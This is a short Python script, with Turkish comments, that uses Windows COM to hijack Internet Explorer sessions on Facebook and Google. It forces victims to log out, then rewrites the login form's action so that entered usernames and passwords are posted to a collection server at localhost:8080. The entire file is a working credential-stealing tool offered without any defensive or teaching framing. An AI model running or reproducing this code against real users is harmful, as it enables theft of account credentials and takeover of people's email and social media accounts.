import time
import urllib.parse
import win32com.client

data_receiver = "http://localhost:8080/"

target_sites = {
    "www.facebook.com":
        {
            "logout_url": None,
            "logout_form": "logout_form",
            "login_form_index": 0,
            "owned": False
        },
    "accounts.google.com":
        {
            "logout_url": "https://accounts.google.com/Logout?hl=en&continue="
                          "https://accounts.google.com/"
                          "ServiceLogin%3Fservice%3Dmail",
            "logout_form": None,
            "login_form_index": 0,
            "owned": False
        }
}

target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)


def wait_for_browser(browser):
    # tarayıcının bir sayfayı yüklemeyi bitirmesini bekleyin
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return


while True:
    for browser in windows:
        url = urllib.parse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue
            # bir URL varsa onu yönlendirebiliriz
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                # belgedeki tüm öğeleri al
                full_doc = browser.Document.all
                # çıkış formunu aramayı tekrarla
                for i in full_doc:
                    try:
                        # çıkış formunu bul ve gönder
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            try:
                # şimdi giriş formunu değiştirelim
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.parse.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (
                    data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass
        time.sleep(5)
